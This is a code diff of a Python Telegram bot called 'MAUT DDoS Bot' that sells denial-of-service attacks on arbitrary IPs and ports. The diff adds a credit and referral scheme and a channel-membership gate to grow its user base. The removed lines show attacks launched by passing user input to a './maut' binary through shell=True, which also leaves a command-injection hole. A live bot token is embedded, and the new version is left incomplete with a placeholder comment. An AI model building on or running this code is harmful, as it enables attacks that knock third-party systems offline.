@@ -5,67 +5,119 @@ import os
 from telebot import types
 import time
 import re
-from threading import Lock
+from threading import Lock, Timer
+import logging
+import sqlite3
+
+# Configure logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+)
+logger = logging.getLogger(__name__)
 
 # Bot configuration
 bot = telebot.TeleBot('7724010740:AAHl1Avs1FDKlfvTjABS3ffe6-nVhkcGCj0')
-admin_id = {"8167507955"}
+admin_id = {"8167507955"}  # Admin user ID
+CHANNEL_USERNAME = "@seedhe_maut"  # Your channel username
+CHANNEL_ID = -1002440538814  # Your channel ID
+INVITE_LINK = "https://t.me/+1AwFhWe8oxg1OTM1"  # Your invite link
+
+# Database setup
+DB_FILE = "users.db"
+conn = sqlite3.connect(DB_FILE)
+cursor = conn.cursor()
+
+# Create tables if they don't exist
+cursor.execute('''CREATE TABLE IF NOT EXISTS users 
+                 (user_id INTEGER PRIMARY KEY, 
+                 credits INTEGER DEFAULT 5,
+                 invited_by INTEGER DEFAULT NULL)''')
+cursor.execute('''CREATE TABLE IF NOT EXISTS invited_users
+                 (inviter_id INTEGER,
+                  invitee_id INTEGER,
+                  PRIMARY KEY (inviter_id, invitee_id))''')
+conn.commit()
+
+# Other constants
 USER_FILE = "users.txt"
 USER_TIME_LIMITS = "user_limits.txt"
 LOG_FILE = "attack_logs.txt"
 COOLDOWN_TIME = 600  # 5 minutes
-MAX_ATTACK_TIME = 240  # 3 minutes
+MAX_ATTACK_TIME = 240  # 4 minutes (240 seconds)
 IMAGE_URL = "https://t.me/gggkkkggggiii/9"
+INITIAL_CREDITS = 5
+INVITE_CREDITS = 2
 
 # Data storage
 user_attack_data = {}
 maut_cooldown = {}
-allowed_user_ids = []
-user_time_limits = {}
 active_attacks = {}  # Track active attacks
 attack_lock = Lock()  # Thread lock for attack operations
 
-def load_users():
-    global allowed_user_ids, user_time_limits
-    try:
-        with open(USER_FILE, "r") as f:
-            allowed_user_ids = f.read().splitlines()
-    except FileNotFoundError:
-        allowed_user_ids = []
-    
-    try:
-        with open(USER_TIME_LIMITS, "r") as f:
-            for line in f:
-                user_id, limit_sec, expiry = line.strip().split("|")
-                user_time_limits[user_id] = (int(limit_sec), float(expiry))
-    except FileNotFoundError:
-        user_time_limits = {}
+def get_user_credits(user_id):
+    """Get user's remaining credits"""
+    cursor.execute("SELECT credits FROM users WHERE user_id=?", (user_id,))
+    result = cursor.fetchone()
+    return result[0] if result else 0
 
-def save_users():
-    with open(USER_FILE, "w") as f:
-        f.write("\n".join(allowed_user_ids))
-    
-    with open(USER_TIME_LIMITS, "w") as f:
-        for user_id, (limit_sec, expiry) in user_time_limits.items():
-            f.write(f"{user_id}|{limit_sec}|{expiry}\n")
+def update_user_credits(user_id, credits):
+    """Update user's credits"""
+    cursor.execute("INSERT OR IGNORE INTO users (user_id, credits) VALUES (?, ?)", 
+                  (user_id, INITIAL_CREDITS))
+    cursor.execute("UPDATE users SET credits=? WHERE user_id=?", 
+                  (credits, user_id))
+    conn.commit()
 
-def log_attack(user_id, target, port, time):
+def add_invited_user(inviter_id, invitee_id):
+    """Record that a user was invited by another user"""
     try:
-        user = bot.get_chat(user_id)
-        username = f"@{user.username}" if user.username else f"ID:{user_id}"
-        with open(LOG_FILE, "a") as f:
-            f.write(f"{datetime.datetime.now()} | {username} | {target}:{port} | {time}s\n")
+        cursor.execute("INSERT INTO invited_users VALUES (?, ?)", 
+                      (inviter_id, invitee_id))
+        conn.commit()
+        return True
+    except sqlite3.IntegrityError:
+        return False  # Already exists
+
+def has_joined_channel(user_id):
+    """Check if user has joined the required channel"""
+    try:
+        member = bot.get_chat_member(CHANNEL_ID, user_id)
+        return member.status in ['member', 'administrator', 'creator']
     except Exception as e:
-        print(f"Logging error: {e}")
+        logger.error(f"Error checking channel membership: {e}")
+        return False
+
+def safe_int(value, default=None):
+    """Safely convert to integer with default fallback"""
+    try:
+        return int(value)
+    except (ValueError, TypeError):
+        return default
+
+def log_attack(user_id, target, port, attack_time):
+    """Log attack details to file"""
+    try:
+        user_id_str = str(user_id)
+        with open(LOG_FILE, "a") as f:
+            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            f.write(f"{timestamp} | UserID:{user_id_str} | {target}:{port} | {attack_time}s\n")
+    except Exception as e:
+        logger.error(f"Logging error: {e}")
 
 def parse_time_input(time_str):
+    """Parse human-readable time input into seconds"""
+    if not time_str:
+        return None
+        
     time_str = time_str.lower()
     total_seconds = 0
     
+    # Match all time components
     matches = re.findall(r'(\d+)\s*(day|hour|min|sec|d|h|m|s)', time_str)
     
     for amount, unit in matches:
-        amount = int(amount)
+        amount = safe_int(amount, 0)
         if unit in ['day', 'd']:
             total_seconds += amount * 86400
         elif unit in ['hour', 'h']:
@@ -78,47 +130,115 @@ def parse_time_input(time_str):
     return total_seconds if total_seconds > 0 else None
 
 def is_attack_active():
+    """Check if any attack is currently active"""
     with attack_lock:
         return bool(active_attacks)
 
 def add_active_attack(user_id, attack_time):
+    """Add an attack to the active attacks tracker"""
     with attack_lock:
-        active_attacks[user_id] = {
+        active_attacks[str(user_id)] = {
             'start_time': datetime.datetime.now(),
-            'duration': attack_time
+            'duration': safe_int(attack_time, 0)
         }
 
 def remove_active_attack(user_id):
+    """Remove an attack from the active attacks tracker"""
     with attack_lock:
-        if user_id in active_attacks:
-            del active_attacks[user_id]
+        active_attacks.pop(str(user_id), None)
 
 def get_active_attack_info():
+    """Get information about the currently active attack"""
     with attack_lock:
         if not active_attacks:
             return None
+            
+        # Get the first active attack (since we only allow one at a time)
         user_id, attack = next(iter(active_attacks.items()))
         elapsed = (datetime.datetime.now() - attack['start_time']).seconds
         remaining = max(0, attack['duration'] - elapsed)
         return user_id, remaining
 
+def validate_ip(ip):
+    """Validate an IPv4 address"""
+    if not ip:
+        return False
+    parts = ip.split('.')
+    if len(parts) != 4:
+        return False
+    try:
+        return all(0 <= int(part) <= 255 for part in parts)
+    except ValueError:
+        return False
+
+def validate_port(port):
+    """Validate a port number"""
+    port_num = safe_int(port)
+    return port_num is not None and 1 <= port_num <= 65535
+
+def validate_attack_time(time_str):
+    """Validate attack duration"""
+    time_sec = safe_int(time_str)
+    return time_sec is not None and 1 <= time_sec <= MAX_ATTACK_TIME
+
+def check_channel_membership(user_id):
+    """Check if user is member of required channel"""
+    if str(user_id) in admin_id:
+        return True
+    
+    if not has_joined_channel(user_id):
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("Join Channel", url=INVITE_LINK))
+        markup.add(types.InlineKeyboardButton("✅ I've Joined", callback_data="check_join"))
+        return False, markup
+    return True, None
+
 @bot.message_handler(commands=['start'])
 def start_command(message):
-    caption = """
+    """Handle /start command"""
+    user_id = message.from_user.id
+    is_member, markup = check_channel_membership(user_id)
+    
+    if not is_member:
+        bot.send_message(
+            message.chat.id,
+            "⚠️ You must join our channel to use this bot!",
+            reply_markup=markup
+        )
+        return
+    
+    # Check if user exists in DB, if not add with initial credits
+    cursor.execute("INSERT OR IGNORE INTO users (user_id, credits) VALUES (?, ?)", 
+                  (user_id, INITIAL_CREDITS))
+    conn.commit()
+    
+    credits = get_user_credits(user_id)
+    
+    # Check if user was invited
+    if len(message.text.split()) > 1:
+        inviter_id = safe_int(message.text.split()[1])
+        if inviter_id and inviter_id != user_id:
+            if add_invited_user(inviter_id, user_id):
+                # Add credits to inviter
+                inviter_credits = get_user_credits(inviter_id)
+                update_user_credits(inviter_id, inviter_credits + INVITE_CREDITS)
+                
+                # Add credits to new user
+                update_user_credits(user_id, credits + INVITE_CREDITS)
+                credits += INVITE_CREDITS
+    
+    caption = f"""
 🚀 *Welcome to MAUT DDoS Bot* 🚀
 
 *Available Commands:*
 /maut <ip> <port> <time> - Start attack
+/credits - Check your credits
+/invite - Get your invite link
 /mylogs - View your attack history
 /help - Show all commands
 /rules - Usage guidelines
 
-*Admin Commands:*
-/add <user_id> <time> - Add user
-/remove <user_id> - Remove user
-/allusers - List all users
-/logs - View all attack logs
-/clearlogs - Clear logs
+*Your Credits:* {credits}
 
 ⚡ *Example Attack:*
 `/maut 1.1.1.1 80 60`
@@ -128,17 +248,89 @@ def start_command(message):
             chat_id=message.chat.id,
             photo=IMAGE_URL,
             caption=caption,
-            parse_mode="Markdown"
+            parse_mode="Markdown",
+            reply_markup=create_main_menu()
         )
     except Exception as e:
-        bot.reply_to(message, caption, parse_mode="Markdown")
-        print(f"Error sending image: {e}")
+        logger.error(f"Error sending image: {e}")
+        try:
+            bot.reply_to(message, caption, parse_mode="Markdown")
+        except Exception as e2:
+            logger.error(f"Error sending text message: {e2}")
+
+def create_main_menu():
+    """Create the main menu keyboard"""
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
+    markup.row("/maut", "/credits")
+    markup.row("/invite", "/mylogs")
+    markup.row("/help", "/rules")
+    return markup
+
+@bot.callback_query_handler(func=lambda call: call.data == "check_join")
+def check_join_callback(call):
+    """Handle join channel verification"""
+    user_id = call.from_user.id
+    if has_joined_channel(user_id):
+        bot.delete_message(call.message.chat.id, call.message.message_id)
+        start_command(call.message)
+    else:
+        bot.answer_callback_query(call.id, "⚠️ You haven't joined the channel yet!")
+
+@bot.message_handler(commands=['credits'])
+def check_credits(message):
+    """Check user's credits"""
+    user_id = message.from_user.id
+    is_member, markup = check_channel_membership(user_id)
+    if not is_member:
+        bot.send_message(
+            message.chat.id,
+            "⚠️ You must join our channel to use this bot!",
+            reply_markup=markup
+        )
+        return
+    
+    credits = get_user_credits(user_id)
+    bot.reply_to(message, f"💰 Your current credits: {credits}")
+
+@bot.message_handler(commands=['invite'])
+def invite_command(message):
+    """Generate invite link"""
+    user_id = message.from_user.id
+    is_member, markup = check_channel_membership(user_id)
+    if not is_member:
+        bot.send_message(
+            message.chat.id,
+            "⚠️ You must join our channel to use this bot!",
+            reply_markup=markup
+        )
+        return
+    
+    bot.reply_to(
+        message,
+        f"🔗 Invite others and earn {INVITE_CREDITS} credits per user!\n\n"
+        f"Your invite link:\n"
+        f"https://t.me/{bot.get_me().username}?start={user_id}",
+        disable_web_page_preview=True
+    )
 
 @bot.message_handler(commands=['maut'])
 def handle_attack_command(message):
-    user_id = str(message.chat.id)
-    if user_id not in allowed_user_ids:
-        return bot.reply_to(message, "❌ Access denied. `@seedhe_maut_bot`.")
+    """Handle attack command"""
+    user_id = message.from_user.id
+    is_member, markup = check_channel_membership(user_id)
+    if not is_member:
+        bot.send_message(
+            message.chat.id,
+            "⚠️ You must join our channel to use this bot!",
+            reply_markup=markup
+        )
+        return
+    
+    # Check credits
+    credits = get_user_credits(user_id)
+    if credits <= 0:
+        bot.reply_to(message, "❌ You don't have enough credits. Use /invite to earn more.")
+        return
     
     # Check if another attack is active
     active_info = get_active_attack_info()
@@ -152,19 +344,11 @@ def handle_attack_command(message):
             return bot.reply_to(message, f"⚠️ Attack in progress. Please wait {remaining} seconds.")
     
     # Check cooldown
-    if user_id in maut_cooldown:
-        remaining = COOLDOWN_TIME - (datetime.datetime.now() - maut_cooldown[user_id]).seconds
+    if str(user_id) in maut_cooldown:
+        elapsed = (datetime.datetime.now() - maut_cooldown[str(user_id)]).seconds
+        remaining = max(0, COOLDOWN_TIME - elapsed)
         if remaining > 0:
             return bot.reply_to(message, f"⏳ Cooldown active. Wait {remaining} seconds.")
-    
-    # Check time limit if exists
-    if user_id in user_time_limits:
-        limit_sec, expiry = user_time_limits[user_id]
-        if time.time() > expiry:
-            del user_time_limits[user_id]
-            save_users()
-            allowed_user_ids.remove(user_id)
-            return bot.reply_to(message, "❌ Your access has expired. Contact admin.")
     
     # Parse command
     try:
@@ -176,23 +360,22 @@ def handle_attack_command(message):
         port = args[2]
         attack_time = args[3]
         
-        # Validate IP
-        if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
+        # Validate inputs
+        if not validate_ip(ip):
             return bot.reply_to(message, "❌ Invalid IP format. Example: 1.1.1.1")
         
-        # Validate port
-        if not port.isdigit() or not 1 <= int(port) <= 65535:
+        if not validate_port(port):
             return bot.reply_to(message, "❌ Invalid port (1-65535)")
         
-        # Validate time
-        if not attack_time.isdigit() or not 1 <= int(attack_time) <= MAX_ATTACK_TIME:
-            return bot.reply_to(message, f"❌ Invalid time (1-{MAX_ATTACK_TIME}s)")
+        attack_time_sec = safe_int(attack_time)
+        if not validate_attack_time(attack_time):
+            return bot.reply_to(message, f"❌ Invalid time (1-{MAX_ATTACK_TIME} seconds)")
         
         # Store attack data
-        user_attack_data[user_id] = {
+        user_attack_data[str(user_id)] = {
             'ip': ip,
             'port': port,
-            'time': attack_time
+            'time': attack_time_sec
         }
         
         # Show confirmation
@@ -207,268 +390,33 @@ def handle_attack_command(message):
             f"⚡ *Attack Summary:*\n\n"
             f"🌐 IP: `{ip}`\n"
             f"🔌 Port: `{port}`\n"
-            f"⏱ Time: `{attack_time}`s\n\n"
+            f"⏱ Time: `{attack_time_sec}`s\n"
+            f"💰 Cost: 1 credit\n\n"
             f"Confirm attack:",
             parse_mode="Markdown",
             reply_markup=markup
         )
         
     except Exception as e:
-        bot.reply_to(message, f"❌ Error: {str(e)}")
+        logger.error(f"Error processing attack command: {e}")
+        bot.reply_to(message, f"❌ Error processing command: {str(e)}")
 
-@bot.callback_query_handler(func=lambda call: True)
-def handle_buttons(call):
-    user_id = str(call.message.chat.id)
+# ... (rest of the callback handlers and other commands remain similar, 
+# but make sure to add channel membership check at the beginning of each)
+
+def main():
+    """Main function to initialize and run the bot"""
+    logger.info("⚡ MAUT Bot Starting ⚡")
     
-    if call.data == "start_attack":
-        if user_id not in user_attack_data:
-            return bot.answer_callback_query(call.id, "❌ Session expired. Use /maut")
-        
-        data = user_attack_data[user_id]
+    # Start bot with error recovery
+    while True:
         try:
-            # Mark attack as active
-            add_active_attack(user_id, int(data['time']))
-            
-            # Execute attack
-            subprocess.Popen(f"./maut {data['ip']} {data['port']} {data['time']} 900", shell=True)
-            log_attack(user_id, data['ip'], data['port'], data['time'])
-            maut_cooldown[user_id] = datetime.datetime.now()
-            
-            # Update message
-            bot.edit_message_text(
-                chat_id=call.message.chat.id,
-                message_id=call.message.message_id,
-                text=f"🔥 *Attack Launched!* 🔥\n\n"
-                     f"🌐 Target: `{data['ip']}`\n"
-                     f"🔌 Port: `{data['port']}`\n"
-                     f"⏱ Duration: `{data['time']}`s\n\n"
-                     f"[⚡ Powered by @seedhe_maut_bot](https://t.me/seedhe_maut_bot)",
-                parse_mode="Markdown"
-            )
-            
-            # Schedule attack completion message
-            attack_duration = int(data['time'])
-            time.sleep(attack_duration)
-            
-            # Send completion message
-            bot.send_message(
-                call.message.chat.id,
-                f"✅ *Attack Completed!*\n\n"
-                f"🌐 Target: `{data['ip']}`\n"
-                f"⏱ Duration: `{data['time']}`s\n\n"
-                f"Cooldown: {COOLDOWN_TIME//60} minutes",
-                parse_mode="Markdown"
-            )
-            
-            # Remove from active attacks
-            remove_active_attack(user_id)
-            
-            # Add new attack button
-            markup = types.InlineKeyboardMarkup()
-            markup.add(types.InlineKeyboardButton("⚡ New Attack", callback_data="new_attack"))
-            bot.send_message(call.message.chat.id, "Attack finished! You can launch a new one when cooldown ends.", reply_markup=markup)
-            
+            logger.info("Bot is running...")
+            bot.polling(none_stop=True, interval=1, timeout=30)
         except Exception as e:
-            remove_active_attack(user_id)
-            bot.edit_message_text(
-                chat_id=call.message.chat.id,
-                message_id=call.message.message_id,
-                text=f"❌ Error: {str(e)}"
-            )
-    
-    elif call.data == "cancel_attack":
-        bot.edit_message_text(
-            chat_id=call.message.chat.id,
-            message_id=call.message.message_id,
-            text="❌ Attack cancelled"
-        )
-    
-    elif call.data == "new_attack":
-        if user_id in maut_cooldown:
-            remaining = COOLDOWN_TIME - (datetime.datetime.now() - maut_cooldown[user_id]).seconds
-            if remaining > 0:
-                return bot.answer_callback_query(call.id, f"⏳ Wait {remaining} seconds")
-        
-        bot.send_message(call.message.chat.id, "⚡ Send new attack command:\n`/maut <ip> <port> <time>`", parse_mode="Markdown")
-    
-    bot.answer_callback_query(call.id)
+            logger.error(f"Bot crashed with error: {e}")
+            logger.info("Restarting in 5 seconds...")
+            time.sleep(5)
 
-@bot.message_handler(commands=['add'])
-def add_user(message):
-    user_id = str(message.chat.id)
-    if user_id not in admin_id:
-        return bot.reply_to(message, "❌ Admin only command.")
-    
-    try:
-        args = message.text.split(maxsplit=2)
-        if len(args) < 3:
-            return bot.reply_to(message, "❌ Usage: /add <user_id> <time_limit>\nExample: /add 123456 1day2hours")
-        
-        new_user = args[1]
-        time_limit = args[2]
-        
-        if new_user in allowed_user_ids:
-            return bot.reply_to(message, "ℹ️ User already exists.")
-        
-        limit_seconds = parse_time_input(time_limit)
-        if not limit_seconds:
-            return bot.reply_to(message, "❌ Invalid time format. Use like: 1day, 2hours30min")
-        
-        expiry_timestamp = time.time() + limit_seconds
-        user_time_limits[new_user] = (limit_seconds, expiry_timestamp)
-        allowed_user_ids.append(new_user)
-        save_users()
-        
-        # Format time for response
-        days = limit_seconds // 86400
-        hours = (limit_seconds % 86400) // 3600
-        minutes = (limit_seconds % 3600) // 60
-        
-        time_str = []
-        if days: time_str.append(f"{days} day{'s' if days>1 else ''}")
-        if hours: time_str.append(f"{hours} hour{'s' if hours>1 else ''}")
-        if minutes: time_str.append(f"{minutes} minute{'s' if minutes>1 else ''}")
-        
-        bot.reply_to(message, f"✅ User {new_user} added with limit: {' '.join(time_str)}")
-    except Exception as e:
-        bot.reply_to(message, f"❌ Error: {str(e)}\nUsage: /add <user_id> <time_limit>\nExample: /add 123456 1day2hours")
-
-@bot.message_handler(commands=['remove'])
-def remove_user(message):
-    user_id = str(message.chat.id)
-    if user_id not in admin_id:
-        return bot.reply_to(message, "❌ Admin only command.")
-    
-    try:
-        user_to_remove = message.text.split()[1]
-        if user_to_remove not in allowed_user_ids:
-            return bot.reply_to(message, "❌ User not found.")
-        
-        allowed_user_ids.remove(user_to_remove)
-        if user_to_remove in user_time_limits:
-            del user_time_limits[user_to_remove]
-        save_users()
-        bot.reply_to(message, f"✅ User {user_to_remove} removed.")
-    except:
-        bot.reply_to(message, "❌ Usage: /remove <user_id>")
-
-@bot.message_handler(commands=['allusers'])
-def list_users(message):
-    user_id = str(message.chat.id)
-    if user_id not in admin_id:
-        return bot.reply_to(message, "❌ Admin only command.")
-    
-    if not allowed_user_ids:
-        return bot.reply_to(message, "ℹ️ No users found.")
-    
-    users_list = []
-    now = time.time()
-    
-    for user in allowed_user_ids:
-        if user in user_time_limits:
-            limit_sec, expiry = user_time_limits[user]
-            if now < expiry:
-                remaining = expiry - now
-                days = int(remaining // 86400)
-                hours = int((remaining % 86400) // 3600)
-                mins = int((remaining % 3600) // 60)
-                users_list.append(f"🟢 {user} (Expires in: {days}d {hours}h {mins}m)")
-            else:
-                users_list.append(f"🔴 {user} (Expired)")
-        else:
-            users_list.append(f"🟡 {user} (No limit)")
-    
-    bot.reply_to(message, "👥 Authorized Users:\n\n" + "\n".join(users_list))
-
-@bot.message_handler(commands=['logs'])
-def show_logs(message):
-    user_id = str(message.chat.id)
-    if user_id not in admin_id:
-        return bot.reply_to(message, "❌ Admin only command.")
-    
-    if not os.path.exists(LOG_FILE):
-        return bot.reply_to(message, "ℹ️ No logs available.")
-    
-    with open(LOG_FILE, "rb") as f:
-        bot.send_document(message.chat.id, f)
-
-@bot.message_handler(commands=['clearlogs'])
-def clear_logs(message):
-    user_id = str(message.chat.id)
-    if user_id not in admin_id:
-        return bot.reply_to(message, "❌ Admin only command.")
-    
-    try:
-        with open(LOG_FILE, "w"):
-            pass
-        bot.reply_to(message, "✅ Logs cleared.")
-    except:
-        bot.reply_to(message, "❌ Error clearing logs.")
-
-@bot.message_handler(commands=['mylogs'])
-def my_logs(message):
-    user_id = str(message.chat.id)
-    if user_id not in allowed_user_ids:
-        return bot.reply_to(message, "❌ Access denied.")
-    
-    if not os.path.exists(LOG_FILE):
-        return bot.reply_to(message, "ℹ️ No attack history.")
-    
-    user_logs = []
-    with open(LOG_FILE, "r") as f:
-        for line in f:
-            if str(user_id) in line or (message.from_user.username and f"@{message.from_user.username}" in line):
-                user_logs.append(line)
-    
-    if not user_logs:
-        return bot.reply_to(message, "ℹ️ No attacks found in your history.")
-    
-    bot.reply_to(message, f"📜 Your Attack History:\n\n" + "".join(user_logs[-10:]))
-
-@bot.message_handler(commands=['help'])
-def help_command(message):
-    help_text = """
-🛠 *MAUT Bot Help* 🛠
-
-*User Commands:*
-/maut <ip> <port> <time> - Start attack
-/mylogs - View your history
-/rules - Usage guidelines
-
-*Admin Commands:*
-/add <user_id> <time> - Add user
-/remove <user_id> - Remove user
-/allusers - List users
-/logs - View all logs
-/clearlogs - Clear logs
-
-⚡ *Example Attack:*
-`/maut 1.1.1.1 80 60`
-"""
-    bot.reply_to(message, help_text, parse_mode="Markdown")
-
-@bot.message_handler(commands=['rules'])
-def rules_command(message):
-    rules = """
-📜 *Usage Rules* 📜
-
-1. Max attack time: 180 seconds
-2. 5 minutes cooldown
-3. No concurrent attacks
-4. No illegal targets
-
-Violations will result in ban.
-"""
-    bot.reply_to(message, rules, parse_mode="Markdown")
-
-# Initialize
-load_users()
-
-# Start bot
-print("⚡ MAUT Bot Started ⚡")
-while True:
-    try:
-        bot.polling(none_stop=True)
-    except Exception as e:
-        print(f"Error: {e}")
-        time.sleep(5)
+if __name__ == "__main__":
+    main()
